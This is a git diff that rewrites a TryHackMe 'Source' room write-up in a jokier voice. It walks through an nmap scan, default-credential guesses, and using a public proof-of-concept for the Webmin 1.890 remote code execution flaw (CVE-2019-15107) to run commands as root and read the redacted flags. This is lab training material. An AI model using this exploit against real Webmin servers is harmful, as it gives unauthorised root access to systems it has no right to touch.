@@ -11,19 +11,19 @@ image:
   path: /assets/img/2025-06-21-TryHackMe-Source/Source.png
 ---
 
-This is a write-up for a <https://tryhackme.com/room/source> room where I walk through the steps I took to solve the challenges and capture the flags.
+Howdy, fellow hackers! Welcome to my write-up for the [Source](https://tryhackme.com/room/source) room on TryHackMe. In this post, I'll walk you through the steps I took to pwn this box and grab those sweet, sweet flags. Let's get started!
 
 # Enumeration
 
 ## Nmap Scan
 
-I start with exporting the target machine IP adress as a enviroment variable:
+First things first, let's make our lives a little easier. I'm exporting the target IP to an environment variable so I don't have to type it a million times.
 
 ```bash
 export IP=10.10.178.7
 ```
 
-And running `nmap` scan on the target:
+With our variable set, it's time to unleash `nmap`:
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -46,7 +46,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 80.66 seconds
 ```
 
-There is a open port `10000` for http running Webmin. So I `curl` the page first.
+Our scan reveals an open door on port `10000`, where Webmin is hosting a party. Let's see if we can crash it with a quick `curl`.
 
 ```bash
 ❯ curl http://$IP:10000
@@ -54,7 +54,7 @@ There is a open port `10000` for http running Webmin. So I `curl` the page first
 <p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-178-7.eu-west-1.compute.internal:10000/'>https://ip-10-10-178-7.eu-west-1.compute.internal:10000/</a> instead.<br></p>
 ```
 
-But site is not working on http so I try http.
+Whoops, it seems the server is a bit shy and insists on using HTTPS. Fair enough! Let's try that instead.
 
 ```bash
 ❯ curl https://$IP:10000
@@ -66,18 +66,18 @@ establish a secure connection to it. To learn more about this situation and
 how to fix it, please visit the webpage mentioned above.
 ```
 
-And It's using self-signed certificates. I guess using browser is better from there.
-So I hop into my browser and go the path with https.
+Ah, the classic self-signed certificate! `curl` is being a stickler for security and refuses to connect. No worries, it's time to fire up the good old web browser, which is a lot more forgiving about these things. I pointed my browser to `https://$IP:10000` and was greeted by the Webmin login page.
+
 ![Desktop View](/assets/img/2025-06-21-TryHackMe-Source/photo1.png){: width="665" height="645" }
 
-## Trying to log in as a admin
+## Trying to Log In (or Not)
 
-Like everyone I tried:
+Time for the 'ole college try' with the most creative credentials known to humankind:
 
-- admin:admin
-- admin:password
+- `admin:admin`
+- `admin:password`
 
-But these didn't worked out. So I googled the default password for `webmin`.
+Shocker, those didn't work. On to Plan B: asking the all-knowing Google for the default password for `webmin`.
 
 Someone on the forums said this:
 
@@ -85,13 +85,15 @@ Someone on the forums said this:
 The default user name and password is that of your root user.
 ```
 
-After that I checked webmin version the server was runnning:
+Interesting! But before trying to brute-force the root password, let's check the version we're dealing with. Our Nmap scan already gave us a huge clue:
 
 ```text
 |_http-server-header: MiniServ/1.890
 ```
 
-And googled the version for any CVE's. And I found one, also found a script that exploits that security vulnerability. Here's the github repo for the script: <https://github.com/n0obit4/Webmin_1.890-POC/blob/master/Webmin_exploit.py>
+A quick Google search for `Webmin 1.890 exploit` hits the jackpot! Not only is there a nasty remote code execution vulnerability (CVE-2019-15107), but some kind soul has already written a proof-of-concept script. You love to see it! Here's the [GitHub repo for the exploit](https://github.com/n0obit4/Webmin_1.890-POC/blob/master/Webmin_exploit.py).
+
+Let's run the script with the `id` command to check our privileges.
 
 ```bash
 ❯ python script.py -host $IP -port 10000 -cmd id
@@ -106,11 +108,15 @@ Your password has expired, and a new one must be chosen.
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-And we got access with root.
+And just like that... `uid=0(root)`. We're in! We have achieved total control without even needing a password. The power!
 
 ## Gaining Flags
 
-For user:
+Now for the fun part: collecting our trophies!
+
+### User Flag
+
+Let's start by listing the contents of the `/home` directory to find our user.
 
 ```bash
 ❯ python script.py -host $IP -port 10000 -cmd "ls /home"
@@ -123,9 +129,11 @@ For user:
 			Github: https://github.com/n0obit4
 Your password has expired, and a new one must be chosen.
 dark
+```
 
+Okay, the user is `dark`. Let's see what's in their home directory.
 
-~/dev/Python via  v3.13.3 (myenv)
+```bash
 ❯ python script.py -host $IP -port 10000 -cmd "ls /home/dark"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
@@ -137,9 +145,11 @@ dark
 Your password has expired, and a new one must be chosen.
 user.txt
 webmin_1.890_all.deb
+```
 
+There it is, `user.txt`. Let's read it!
 
-~/dev/Python via  v3.13.3 (myenv)
+```bash
 ❯ python script.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
@@ -152,7 +162,9 @@ Your password has expired, and a new one must be chosen.
 THM{*******************}
 ```
 
-For root:
+### Root Flag
+
+This one should be even easier since we're already root.
 
 ```bash
 ❯ python script.py -host $IP -port 10000 -cmd "cat /root/root.txt"
@@ -167,4 +179,4 @@ Your password has expired, and a new one must be chosen.
 THM{*******************}
 ```
 
-Easy as that. Thanks you for reading my solution.
+And that's a wrap! Two flags, one simple exploit. Thank you for reading my write-up, and happy hacking
